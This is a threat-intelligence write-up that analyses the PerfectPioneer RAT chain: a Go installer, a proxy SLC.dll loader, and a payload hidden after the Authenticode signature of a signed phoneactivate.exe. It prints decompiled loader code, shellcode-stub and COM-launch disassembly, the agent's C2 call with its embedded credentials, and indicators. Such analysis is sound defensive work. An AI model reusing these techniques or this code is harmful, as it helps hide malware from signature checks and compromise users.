---
title: "PerfectPioneer's phoneactivate.exe is unmodified Microsoft code with the RAT in its signature"
date: 2026-11-17T20:18:17+00:00
slug: "perfectpioneer-signed-phoneactivate"
description: "Unit 42's PerfectPioneer report describes side-loading through a modified host binary with XOR-encrypted shellcode. The rat_http3_cc host on Hybrid Analysis has an intact Microsoft signature and carries the Go RAT, unencrypted, after the PKCS#7 blob in its certificate table. A Go installer drops it with a proxy SLC.dll and starts it through the Help Pane COM server. Six loader builds, the container, the stub, the agent's login and a C2 map across seventeen Go programs."
tags: ["perfectpioneer", "tgr-sta-0049", "golang", "dll-sideloading", "authenticode", "http3"]
sample:
  family: "PerfectPioneer RAT (rat_http3_cc)"
  sha256: "52d3442fb26023ebc0bc76542b56be88d1c3327c8bcedf1dcb95f80511527f07"
  source: "[Hybrid Analysis](https://www.hybrid-analysis.com/sample/52d3442fb26023ebc0bc76542b56be88d1c3327c8bcedf1dcb95f80511527f07)"
toc: true
---

The `phoneactivate.exe` that delivers PerfectPioneer's rat_http3_cc variant is Microsoft's own Phone Activation UI, version 10.0.26100.1150, with its Authenticode digest still matching. The RAT sits behind the signature: 7,302,889 bytes appended after the PKCS#7 blob inside the certificate table, introduced by the marker `INJECT_01` and the name `code.bin`, unencrypted. A proxy `SLC.dll` placed next to it reads those bytes back from disk at a hard-coded offset and jumps into them. A 4,841-byte stub maps the Go agent that follows, and the agent logs in to `hxxps://ads-edge[.]com:36897` with a username and password compiled into `main.main`.

Unit 42 described PerfectPioneer and its successor KUKURAT on 2026-11-16 in [QUIC and Covert](https://unit42.paloaltonetworks.com/custom-rats-target-southeast-asia-governments/), attributing both to the cluster it tracks as TGR-STA-0049. The report covers the RAT's commands, its HTTP/3 transport and the `isDangerousCommand` filter in detail, and gives side-loading one paragraph: a legitimate executable "structurally modified to contain XOR-encrypted shellcode", and a loader DLL beside it. I pulled the rat_http3_cc files from its indicator list that Hybrid Analysis has, then the loader DLLs and the other agents: 24 files from Hybrid Analysis and one I carved out of them, to see what that paragraph covers.

## What I found

- Four entries filed under different headings in the report are one chain. The "modified host binary" `d700b573` is a Go installer that embeds the loader `2e52b293` (a proxy for `SLC.dll`) and the signed `phoneactivate.exe` `52d3442f`, and the agent inside that `phoneactivate.exe` is the "core agent" `183abf82`. A second "core agent", `fb5b0b1d`, is another build of the installer.
- In this October chain nothing is XOR-encrypted, and the host `52d3442f` is byte for byte what Microsoft signed apart from the appended payload. The loader opens `phoneactivate.exe` as a file, reads 0x6f6ee9 bytes from offset 0x20a65 into RWX memory and calls the first byte. XOR with `0xAA` appears in the loader builds from 24 October on, and a March 2026 build switches to `0xED`.
- Six loader builds from the indicator list, compiled between 2025-10-14 and 2026-03-09, proxy three different system DLLs and drop the Run-key code after October. The 32-bit `vrfcore.dll` the report lists as the rat_http3_cc loader reads an offset that lands in the resources of the `phoneactivate.exe` copies listed beside it, so it belongs to a different host file.
- The agent authenticates to `/auth/login` as `dhsfhakhaskjyuiashfhasjkdfhjkh` with password `askjdfklsagklhkhzokhfd` and turns off certificate verification. The Pioneer build `8bf94019` carries the same URL and the same credentials.
- Sixteen of the 17 Go programs carry exactly one C2 URL, each with a fixed port, and the builds of each HTTP/3 variant agree. The earliest RatAAkk-tt build points at `192.168.26[.]10:56893`, a private address.

## Four indicators, one chain

I started with the "rat_http3_cc modified host binary" entries, expecting patched Windows programs. The report lists four; Hybrid Analysis has three. Two of them are `phoneactivate.exe`. The third, `d700b573`, is a Go program, and it carries two pclntabs (the function table every Go binary has). The first, at file offset 0x5a018e, belongs to an embedded agent; the second, at 0x800ca0, names the outer program's functions: `main.wndProc`, `main.extractFiles`, `main.runExtractedProgram` and `main.executeViaCOM`.

`extractFiles` reads two entries from a Go `embed.FS` and writes them to the user's home directory:

```asm {title="main.extractFiles (d700b573), trimmed"}
0x48b786: call 0x4797e0 ; os.UserHomeDir
0x48b7a5: lea rbx, [rip + 0x1ccaf] ; (1) "phoneactivate.exe"
0x48b7ac: mov ecx, 0x11
0x48b7b1: call 0x475b40 ; embed.FS.ReadFile
0x48b828: call 0x481840 ; path/filepath.join
0x48b868: call 0x4798a0 ; os.WriteFile
0x48b874: lea rbx, [rip + 0x1a474] ; (2) "SLC.dll"
0x48b87b: mov ecx, 7
0x48b880: call 0x475b40 ; embed.FS.ReadFile
0x48b933: call 0x4798a0 ; os.WriteFile
```

The bytes behind (1) and (2) are in the installer's `.rdata` at file offsets 0xcfa20 and 0xae820. Carved out, they hash to `52d3442f`, the signed `phoneactivate.exe` from the same indicator section, and `2e52b293`, a DLL the report files under "loader DLL components". Hybrid Analysis received the installer and that DLL 67 seconds apart, at 16:19:55 and 16:21:02 UTC on 2025-10-29. The other "core agent" with the same project path, `fb5b0b1d`, is a second build of the installer with the same four functions, and it carries the same DLL plus the second `phoneactivate.exe` copy, `904409ce`.

While the files are written, the installer shows a window of class `InstallerClass` titled "Authorization component", with "Setup will install the software on your computer", an Install and a Close button, and "Preparing..." and "Installing..." states. `runExtractedProgram` then hands `file://` plus the path of the dropped `phoneactivate.exe` to `executeViaCOM`:

```asm {title="main.executeViaCOM (d700b573), trimmed"}
0x48baed: movabs rcx, 0x11d907a18cec58ae ; (1) CLSID {8CEC58AE-07A1-11D9-B15E-000D56BFE6EE}, with the next qword
0x48bafa: movabs rcx, 0xeee6bf560d005eb1
0x48bb1c: movabs rcx, 0x11d907a18cec592c ; (2) IID {8CEC592C-07A1-11D9-B15E-000D56BFE6EE}
0x48bb88: mov qword ptr [rax + 0x10], 0x17 ; CLSCTX_ALL
0x48bbb7: call 0x485200 ; LazyProc.Call (CoCreateInstance)
0x48bbce: lea rbx, [rip + 0x1a1d7] ; "file://"
0x48bc24: mov r8, qword ptr [r8 + 0x30] ; (3) vtable slot 6
0x48bc3a: call 0x45a500 ; syscall.Syscall (object, URL)
0x48bc55: mov rax, qword ptr [rdx + 0x10] ; Release
```

The GUIDs at (1) and (2) are the Help Pane server and `IHxHelpPaneServer`, whose local server is `C:\Windows\helppane.exe` according to [Strontic's xcyclopedia entry](https://strontic.github.io/xcyclopedia/library/clsid_8cec58ae-07a1-11d9-b15e-000d56bfe6ee). After the three `IUnknown` methods, the interface declares `DisplayTask`, `DisplayContents`, `DisplaySearchResults` and `Execute(LPCWSTR)`, so slot 6 at (3) is `Execute`. vx-underground's VX-API has the same call sequence as [`CreateProcessFromIHxHelpPaneServer`](https://github.com/vxunderground/VX-API/blob/main/VX-API/CreateProcessFromIHxHelpPaneServer.cpp). The effect is that `phoneactivate.exe` starts as a child of `helppane.exe`, not of the installer.

## phoneactivate.exe still verifies

`52d3442f` is 7,436,624 bytes, which is a lot for a dialog. Its certificate directory starts at file offset 0x1e000 and is 0x6f9950 bytes long, ending exactly at the end of the file. The PKCS#7 `SignedData` inside it is 0x2a2d bytes. Everything after that is the payload:

```hexdump {title="52d3442f at 0x20a20"}
00020a20: 9f23 3040 a47c db3b 5ee7 f2b4 c97f 2c1c  .#0@.|.;^.....,.
00020a30: bac7 1459 1300 0000 494e 4a45 4354 5f30  ...Y....INJECT_0
00020a40: 3163 6f64 652e 6269 6e00 0000 0000 0000  1code.bin.......
00020a50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00020a60: 00e9 6e6f 0048 81ec c802 0000 48c7 8424  ..no.H......H..$
```

The DER signature ends at 0x20a34, three zero bytes pad it, and the container header follows:

| Offset | Size | Field | Value |
|---|---|---|---|
| 0x20a38 | 9 | marker | `INJECT_01` |
| 0x20a41 | 32 | name, NUL-padded | `code.bin` |
| 0x20a61 | 4 | code size, little-endian | 0x006f6ee9 (7,302,889) |
| 0x20a65 | 0x6f6ee9 | code | `48 81 EC C8 02 00 00` = `sub rsp, 0x2c8` |
| 0x71794e | 2 | padding | `00 00` |

My first reading of 0x20a61 was wrong. `E9` is a `jmp rel32` opcode, and capstone happily decoded `E9 6E 6F 00 48` as a jump to 0x48006f73, which landed in a run of `int3` padding. The real instruction stream starts four bytes later, and 0x6f6ee9 plus the two padding bytes is exactly the distance to the end of the file.

I made a second wrong call before checking the signature. The two `phoneactivate.exe` copies differ in 4,128 bytes, all in the `fothk` section and in `.data`. `52d3442f` has initialized pointers and a security cookie in `.data`, and I took it for an image dumped from memory and `904409ce` for the clean file. The Authenticode check says the opposite:

```console
$ re-py -I authenticode.py 52d3442f 904409ce
52d3442f CN=Microsoft Windows | CN=Microsoft Windows Production PCA 2011
  verify VERIFICATION_FLAGS.OK
  digest match True 87e061b0bf1a0ed462408fab2c8ea15e492104e4a73d17bc5ba12572fff6f7b2
904409ce CN=Microsoft Windows | CN=Microsoft Windows Production PCA 2011
  verify VERIFICATION_FLAGS.BAD_DIGEST|BAD_SIGNATURE
  digest match False 87e061b0bf1a0ed462408fab2c8ea15e492104e4a73d17bc5ba12572fff6f7b2
```

`52d3442f` is Microsoft's file with data appended inside the certificate table, which the Authenticode hash skips, so the digest still matches. `904409ce` has the `fothk` section and `.data` zeroed (all but the last 32 `CC` bytes of `fothk`) and the same 7.3 MB payload. Its `.text` is identical and the loader reads the payload by file offset, so the zeroing changes nothing in the chain; I don't know why that copy exists. The file that does come from memory is a different one: the "core agent" `619b749e` has every section's file offset equal to its virtual address and `.data` at its full virtual size, and it differs from `183abf82` only in `.data` (6,307 bytes), one `.symtab` byte and 22 header bytes.

Appending data after the signature is old ([CVE-2013-3900](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2013-3900)). Microsoft's fix, `EnableCertPaddingCheck`, is opt-in and makes `WinVerifyTrust` reject extra data after the signature. Without it, a scanner that trusts Microsoft-signed files sees a Microsoft-signed file.

## The proxy SLC.dll reads the payload as a file

`phoneactivate.exe` imports nine functions from `SLC.dll`, the Software Licensing Client. `2e52b293` exports the same nine names, so the planted copy beside the executable satisfies the import. Its PDB path is `D:\2022pro\Dll1\x64\Release\MFSENSORGROUP.pdb` and its export directory still calls it `MFSENSORGROUP.dll`. I think the project started as a proxy for that DLL and was renamed in the export table only. Eight exports are `ret 0`. `SLOpen` jumps to the loader:

```c {title="SLOpen -> 0x180001070 (2e52b293), from Ghidra, error paths trimmed, names mine"}
GetModuleFileNameA(NULL, self, 0x104);
RegOpenKeyExA(HKCU, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &k);
RegSetValueExA(k, "WindowsSecurityUpdate", 0, REG_SZ, self, len);   // (1)
GetModuleFileNameA(NULL, dir, 0x104);
*strrchr(dir, '\\') = 0;
sprintf_s(path, 0x104, "%s\\phoneactivate.exe", dir);
h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0x80, NULL);
SetFilePointer(h, 0x20a65, NULL, FILE_BEGIN);                       // (2)
buf = VirtualAlloc(NULL, 0x6f6ee9, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
ReadFile(h, buf, 0x6f6ee9, &got, NULL);
CloseHandle(h);
ret = ((int (*)(void))buf)();                                       // (3)
```

The Run value at (1) points at whatever process loaded the DLL, here `phoneactivate.exe` in the user's home directory. The offset at (2) and the size are the container's code offset and its declared size, compiled in as constants, so each loader build fits exactly one host file. At (3) the loader calls the first byte of the buffer with no decryption.

## A 4,841-byte stub maps the Go PE

The code at 0x20a65 is position-independent x64. It finds kernel32 by walking the PEB's in-memory-order module list (`Ldr+0x20`) to the third entry, then resolves three exports by comparing names it builds on the stack. Each byte is stored 0x10 higher and fixed up in a loop:

```asm {title="stub+0x206"}
0x0206: mov byte ptr [rsp + 0x58], 0x57 ; 'G' + 0x10
0x020b: mov byte ptr [rsp + 0x59], 0x75 ; 'e' + 0x10
...
0x0275: movzx eax, byte ptr [rsp + rax + 0x58]
0x027a: sub eax, 0x10
```

The three names are `GetProcAddress`, `LoadLibraryA` and `VirtualAlloc`. To find itself, the stub writes the nine bytes `E8 00 00 00 00 58 58 50 C3` into a fresh RWX page and calls it: `call $+5`, pop that return address, pop the caller's return address, push it back, return. The page returns its caller's address in `rax`. From there the stub scans forward up to 0x9c4000 bytes for `4D 5A 90 00 03 00`, which it finds 4,841 bytes from its start, and maps that PE: `VirtualAlloc` at the preferred image base (falling back to any address), headers, sections, imports through `LoadLibraryA` and `GetProcAddress`, and finally a call to `AddressOfEntryPoint` with no arguments.

The relocation pass runs only when the preferred base was taken, and it applies every entry as a 64-bit fixup without looking at the type bits. For a Go PE with base 0x400000 inside a process based at 0x140000000 that path should rarely run, and I didn't check whether it would corrupt anything.

The carved PE hashes to `183abf82`, the third rat_http3_cc "core agent" in the report. Its build info names `D:/proj/http3/rat_http3_cc/cmd/agent/main.go`, Go 1.20, quic-go v0.40.1 and `-ldflags="-s -w -H windowsgui"`.

## The agent logs in before it registers

The agent's configuration is three string literals passed to `agent.NewClient`:

```asm {title="main.main (183abf82)"}
0x74d210: call 0x74d0c0 ; main.startHTTPServer
0x74d215: call 0x74d460 ; main.setupPersistence
0x74d21a: lea rax, [rip + 0xc3453] ; "https://ads-edge.com:36897"
0x74d221: mov ebx, 0x1a
0x74d226: lea rcx, [rip + 0xc5b4d] ; (1) "dhsfhakhaskjyuiashfhasjkdfhjkh"
0x74d22d: mov edi, 0x1e
0x74d232: lea rsi, [rip + 0xc0580] ; (2) "askjdfklsagklhkhzokhfd"
0x74d239: mov r8d, 0x16
0x74d240: call 0x7445a0 ; pioneer/internal/agent.NewClient
```

Go's register ABI passes each string as a pointer and a length, so the three pairs are the URL (0x1a bytes), (1) at 0x1e bytes and (2) at 0x16 bytes. `NewClient` stores (1) at client offset 0x60 and (2) at 0x70. `authenticate` copies those two fields into a struct whose type metadata reads `Username json:"username"`, `Password json:"password"` and `ClientType json:"client_type"`, sets the third to `agent`, wraps it with message type `auth` and POSTs it to `/auth/login`. The reply must contain a `token`, which goes into an `Authorization: Bearer` header for `/agent/register` and everything after. The module path is `pioneer`, and its `internal/agent` package holds `register`, `sendHeartbeat`, `pollForCommands`, the file and shell handlers and `isDangerousCommand`.

`NewClient` also allocates a `tls.Config`, sets the byte at offset 0xa0, which the type's field table names `InsecureSkipVerify`, and sets `NextProtos` to `h3`, `h2` and `http/1.1`. The agent accepts any certificate.

Unit 42 already documented the local HTTP server on port 56793 (its `/health` handler returns `{"health":"ok","timestamp":...}`, and the listener binds `:56793`, all interfaces) and the agent's persistence. One detail changes in this chain. `setupPersistence` sleeps five seconds (0x12a05f200 ns), then writes `WindowsUpdate.lnk` into the Startup folder pointing at `os.Executable()`. Since the agent was mapped into `phoneactivate.exe`, that is the path of the signed Microsoft binary. The rat_http3_cc agent has no Run-key string at all. The `WindowsSecurityUpdate` Run value comes from the loader DLL, and it also points at `phoneactivate.exe`. The newhttp3 agents do contain the `CurrentVersion\Run` path themselves.

## Six loader builds, October to March

The report lists fourteen loader DLLs: twelve "loader DLL components" and one "loader DLL" each for newhttp3 and rat_http3_cc. I got six from Hybrid Analysis (two more failed to download). They are one code base proxying three system DLLs, under four internal names:

| Build | Compiled (UTC) | Proxies | Trigger | Reads | Offset | Size | XOR |
|---|---|---|---|---|---|---|---|
| `2e52b293` | 2025-10-14 | SLC.dll | `SLOpen` | `phoneactivate.exe` | 0x20a65 | 0x6f6ee9 | none |
| `8cfe629f` x86 | 2025-10-16 | vrfcore.dll | `VerifierOpenLayerProperties` | `phoneactivate.exe` | 0x1bbe5 | 0x10fdbf | none |
| `9dfefc71` | 2025-10-24 | vrfcore.dll | `VerifierOpenLayerProperties` | `appverif.exe` | 0x27f08 | 0x2beae9 | 0xAA |
| `600572a9` | 2025-11-20 | SLC.dll | `SLOpen` | its own executable | 0x20a38 | 0x76a4e9 | 0xAA |
| `24c46bc9` | 2025-12-02 | WTSAPI32.dll | `WTSRegisterSessionNotification` | its own executable | 0xf5bb8 | 0x76a4e9 | 0xAA |
| `f82c0618` | 2026-03-09 | WTSAPI32.dll | `WTSRegisterSessionNotification` | its own executable | 0xf5bb8 | 0xabd6e9 | 0xED |

The three October builds write the `WindowsSecurityUpdate` Run value, and the later three don't import the registry API at all. The x64 `vrfcore.dll` and the December `WTSAPI32.dll` also hide the console window first. From November on the loader stops building a file name: it opens the path from `GetModuleFileNameA` unchanged, meaning the executable it was loaded into. The XOR runs over the whole buffer. In October it is a byte loop; from November the compiler unrolled it to 64 bytes per iteration with a 16-byte constant (`AA` repeated, or `ED` repeated in March) and a byte loop for the last 0x29 bytes. The March build also guards its trigger export with a run-once flag; the earlier ones are a bare `jmp`.

The November build reads from 0x20a38, where `INJECT_01` starts in this `phoneactivate.exe` build (after the PKCS#7 blob and three bytes of padding), and executes from there, so its host has no 0x2d-byte header in front of the code. I think it used the same Microsoft file with an encrypted payload in the same place, but I don't have that host.

The 32-bit `vrfcore.dll`, `8cfe629f`, is the one the report files as the "rat_http3_cc loader DLL". I first argued it couldn't work because the listed `phoneactivate.exe` copies are 64-bit, which misses the point: `phoneactivate.exe` doesn't import `vrfcore.dll`, so this DLL is loaded by some 32-bit program that does and only reads `phoneactivate.exe` as data. What rules out the listed copies is the offset. In them 0x1bbe5 lands in the XML of the `.rsrc` section, so this loader pairs with a different `phoneactivate.exe` holding a 1.1 MB x86 payload at that offset, which I didn't find among the report's hashes on Hybrid Analysis.

## One host, one port per variant

Unit 42 lists the C2 domains without saying which build uses which. Reading the other agents fills that in. For the rat_http3_cc and Pioneer builds the values below come from the `NewClient` call site; for the others they are the only URL strings with an explicit port in the binary, which I didn't trace to the code that uses them:

| Variant | Files | C2 |
|---|---|---|
| RatAAkk-tt | `d725ad8b` | `hxxp://192.168.26[.]10:56893` |
| RatAAkk-tt | `9721d65e` | `hxxp://www.thailisting[.]net:56893` |
| PerfectRat | `f4c9d5d1` | `hxxp://www.yangon.it[.]com:8080` |
| rat_http3_ls | `92fb9545` | `hxxps://www.maui-cocktailbar[.]com:8443` |
| no project path | `bf8afbd1` | `hxxps://www.maui-cocktailbar[.]com:443` |
| Pioneer | `8bf94019` | `hxxps://ads-edge[.]com:36897` |
| rat_http3_cc | `183abf82`, `619b749e`, both installers | `hxxps://ads-edge[.]com:36897` |
| newhttp3 | 6 agents | `hxxps://www.wkuyda[.]com:56123` |

`d725ad8b`, the earliest submission among the files I have (Hybrid Analysis, 2025-08-10), talks to a private address. I read it as a build from the author's own network that left before its URL was changed, and the same project's later file uses `thailisting[.]net` on the same port. The Pioneer build shares the rat_http3_cc server, port and credentials, which fits the report's description of rat_http3_cc as a continuation of Pioneer. One more file, `c4b46477`, has neither a project path nor a URL string. Seqrite already covered it: it is `HolidayNotice.pdf.exe` from the April 2026 campaign in their QUICSILVER report, which gets its C2 through Cloudflare Workers. I found no `workers[.]dev` string in it in plain text and didn't look further.

## What I couldn't determine

I don't have a host for five of the six loaders: the 32-bit `phoneactivate.exe` for `8cfe629f`, the `appverif.exe` for `9dfefc71`, and the executables the three later builds read themselves from. They are probably the "modified host binary" hashes the report lists that Hybrid Analysis doesn't serve (`5f857ff7`, `b975f593`, `b5bea4d8`, `77455239`), but I can't check. Two other loaders, `61f7e2f4` and `0c49e1b9`, failed to download. The six newhttp3, RatAAkk-tt and PerfectRat agents pull in AES and other code that I didn't trace, so their table rows are strings, not decoded configurations. KUKURAT is out of scope here.

## The extractor

[`families/perfectpioneer`](https://github.com/stateless-re/tools/tree/main/families/perfectpioneer) in my tools repository takes any file from this chain and prints JSON: the installer's embedded files, a loader's host name, offset, size, key, trigger export and Run value, a host's container (marker, name, size, XOR key, stub strings) and whether its signature digest still matches, and an agent's `NewClient` URL and credentials or its URL strings. With `-o DIR` it writes the carved PEs, named by SHA-256. I ran it on all 25 files in this post; it reproduces every value in the tables above.

## Indicators

| SHA-256 | Role |
|---|---|
| `d700b573ea8387efad633a70124b7a2a3aece844a267157b1cb55be7b62f3b67` | Go installer, embeds 2e52b293 + 52d3442f |
| `fb5b0b1d083d6f6afa90948bd1fd1a498b51dd3f6dc7f90a02a2a17818756563` | Go installer, embeds 2e52b293 + 904409ce |
| `52d3442fb26023ebc0bc76542b56be88d1c3327c8bcedf1dcb95f80511527f07` | phoneactivate.exe, valid signature, INJECT_01 container |
| `904409ce8846394e1fe9a5ce37f2265cbf6933611278ae57fdf5fa74759af2bb` | phoneactivate.exe, same container, digest broken |
| `2e52b2936e67872d1364d2d0d26a8733ed9582b38f6f0b3a877ffdd6e2c04aa4` | loader, SLC.dll proxy (MFSENSORGROUP), October |
| `8cfe629fc08ae06c8ba106113ba30bb16fa2fbbf8bd3dd6831d16b031e0ebe70` | loader, vrfcore.dll proxy, x86 |
| `9dfefc7118646535d1193e1b036dd0c93fa66cc585a60301fcdceb6f45903aad` | loader, vrfcore.dll proxy, x64, XOR 0xAA |
| `600572a912650b258d56aedeef0ab712abbe35a38cdd23faa5a95dacfdc67b7f` | loader, SLC.dll proxy, XOR 0xAA |
| `24c46bc9269e1c1ee54004e01d5c7c54f759bc1b93a282d3561d2d27f678af86` | loader, WTSAPI32.dll proxy, XOR 0xAA |
| `f82c06184ab36e91d28f7802c739e637792c241a7ff2fba9ca24178f12423684` | loader, WTSAPI32.dll proxy, XOR 0xED |
| `64230ef10e64df84509276b531a7b148aaca6a4051737bf7a80c1a3a56d61bc3` | code.bin (stub + agent), carved |
| `183abf82951c2052e9a1829c70c173c11756e8df0e86c8071c27df0988caeaa0` | rat_http3_cc agent |
| `619b749e1c6634d38f15c51005a4237e9076aaaf36927b562a990e8bc34fdfcb` | rat_http3_cc agent, memory image |
| `8bf9401990d3255d1022a25884b02ee75ef01bd1a729d29ff52de2e5f0d637a2` | Pioneer agent |

All of these except the carved `code.bin` are in Unit 42's list and on Hybrid Analysis. The table in the previous section names the other agents I read.

Network:

- `hxxps://ads-edge[.]com:36897`, path `/auth/login` with `"client_type":"agent"`, then `/agent/register`
- `hxxps://www.wkuyda[.]com:56123`, `hxxps://www.maui-cocktailbar[.]com:8443` and `:443`, `hxxp://www.thailisting[.]net:56893`, `hxxp://www.yangon.it[.]com:8080`
- TCP 56793 listening on all interfaces (rat_http3_cc agent)

Host:

- `%USERPROFILE%\phoneactivate.exe` next to `%USERPROFILE%\SLC.dll`, started by `C:\Windows\helppane.exe`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, value `WindowsSecurityUpdate`
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk` pointing at `phoneactivate.exe`
- A signed `phoneactivate.exe` whose certificate directory is megabytes long, or contains `INJECT_` after the PKCS#7 blob

## ATT&CK

| ID | Technique | Here |
|---|---|---|
| T1574.002 | DLL Side-Loading | proxy `SLC.dll`, `vrfcore.dll`, `WTSAPI32.dll` next to a signed host |
| T1027.009 | Embedded Payloads | agent in the certificate table; host and loader in the installer's `embed.FS` |
| T1140 | Deobfuscate/Decode Files or Information | XOR 0xAA / 0xED in the later loaders |
| T1620 | Reflective Code Loading | stub maps the Go PE in `phoneactivate.exe` |
| T1559.001 | Component Object Model | `IHxHelpPaneServer::Execute` starts the host |
| T1547.001 | Registry Run Keys / Startup Folder | `WindowsSecurityUpdate` Run value, `WindowsUpdate.lnk` |
| T1071.001 | Web Protocols | JSON over HTTPS, quic-go client with ALPN `h3`, `h2`, `http/1.1` |

## Ending

The rat_http3_cc agent runs inside a Windows binary that still passes Microsoft's signature check, started by `helppane.exe` and launched again at every logon by two entries that also point at that binary. Process names, parents and signers all look like Windows. The certificate table doesn't: Microsoft's own `phoneactivate.exe` has a signature of about 11 KB, and this one has 7.3 MB behind it. A signed executable whose security directory is much bigger than its signature, or a `phoneactivate.exe` outside `System32`, is worth a look whichever loader build comes next.

## Credits and further reading

- Tom Fakterman, Unit 42: [QUIC and Covert: Novel HTTP/3-Powered RATs Target Southeast Asian Governments](https://unit42.paloaltonetworks.com/custom-rats-target-southeast-asia-governments/) (2026-11-16), the indicator list every file here comes from.
- Priya Patel, Seqrite: [Operation QUICSILVER](https://www.seqrite.com/blog/operation-quicsilver-china-nexus-actor-targets-myanmar-diplomats-via-vhd-delivered-go-backdoor/) (2026-08-17), an earlier campaign against Myanmar whose indicators include `maui-cocktailbar[.]com` and the agent `c4b46477`.
- vx-underground, VX-API: [`CreateProcessFromIHxHelpPaneServer`](https://github.com/vxunderground/VX-API/blob/main/VX-API/CreateProcessFromIHxHelpPaneServer.cpp).
- Strontic xcyclopedia: [CLSID 8cec58ae-07a1-11d9-b15e-000d56bfe6ee](https://strontic.github.io/xcyclopedia/library/clsid_8cec58ae-07a1-11d9-b15e-000d56bfe6ee).
- Microsoft: [CVE-2013-3900, WinVerifyTrust signature validation](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2013-3900).
- Samples from [Hybrid Analysis](https://www.hybrid-analysis.com/sample/52d3442fb26023ebc0bc76542b56be88d1c3327c8bcedf1dcb95f80511527f07).
